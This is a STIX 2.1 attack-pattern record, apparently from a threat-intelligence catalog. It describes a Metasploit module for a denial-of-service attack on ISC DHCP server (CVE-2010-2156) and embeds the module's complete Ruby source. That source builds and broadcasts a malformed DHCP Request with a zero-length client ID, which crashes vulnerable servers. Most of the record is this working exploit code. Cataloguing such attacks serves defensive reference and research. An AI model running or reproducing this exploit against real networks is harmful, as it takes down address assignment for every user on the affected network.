{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59273780-342f-4bb5-b428-c0a653894101",
    "created": "2024-08-14T16:24:59.418294Z",
    "modified": "2024-08-14T16:24:59.418298Z",
    "name": "ISC DHCP Zero Length ClientID Denial of Service Module",
    "description": " This module performs a Denial of Service Attack against the ISC DHCP server versions 4.1 before 4.1.1-P1 and 4.0 before 4.0.2-P1. It sends out a DHCP Request message with a 0-length client_id option for an IP address on the appropriate range for the dhcp server. When ISC DHCP Server tries to hash this value it exits abnormally. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/dhcp/isc_dhcpd_clientid.rb",
            "external_id": "isc_dhcpd_clientid.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2156"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Dos\n  include Msf::Exploit::Capture\n\n  def initialize\n    super(\n      'Name'          => 'ISC DHCP Zero Length ClientID Denial of Service Module',\n      'Description'   => %q{\n          This module performs a Denial of Service Attack against the ISC DHCP server,\n        versions 4.1 before 4.1.1-P1 and 4.0 before 4.0.2-P1. It sends out a DHCP Request\n        message with a 0-length client_id option for an IP address on the appropriate range\n        for the dhcp server. When ISC DHCP Server tries to hash this value it exits\n        abnormally.\n      },\n      'Author'        =>\n          [\n            'sid', # Original POC\n            'theLightCosine' # msf module\n          ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          [ 'CVE', '2010-2156' ],\n          [ 'OSVDB', '65246'],\n          [ 'EDB', '14185']\n        ]\n    )\n    register_options(\n      [\n        OptAddress.new('RIP', [true, 'A valid IP to request from the server'])\n      ]\n    )\n    deregister_options('FILTER','PCAPFILE','SNAPLEN','TIMEOUT')\n  end\n\n  def run\n    open_pcap\n    print_status(\"Creating DHCP Request with 0-length ClientID\")\n    p = PacketFu::UDPPacket.new\n    p.ip_daddr = \"255.255.255.255\"\n    p.udp_sport = 68\n    p.udp_dport = 67\n\n    # TODO: Get a DHCP parser into PacketFu\n    chaddr = \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\"\n    dhcp_payload = \"\\x63\\x82\\x53\\x63\\x35\\x01\\x03\\x3d\\x00\\xff\"\n    p.payload = dhcp_req(chaddr,dhcp_payload)\n    p.recalc\n    print_status(\"Sending malformed DHCP request...\")\n    capture_sendto(p, '255.255.255.255')\n    close_pcap\n  end\n\n  def dhcp_req(chaddr,payload)\n    req = \"\\x00\" * 236\n    req[0,3] = \"\\x01\\x01\\x06\" # Boot request on Eth with hw len of 6\n    req[12,4] = Rex::Socket.addr_aton(datastore['RIP'])\n    req[28,6] = chaddr\n    req + payload\n  end\nend\n"
}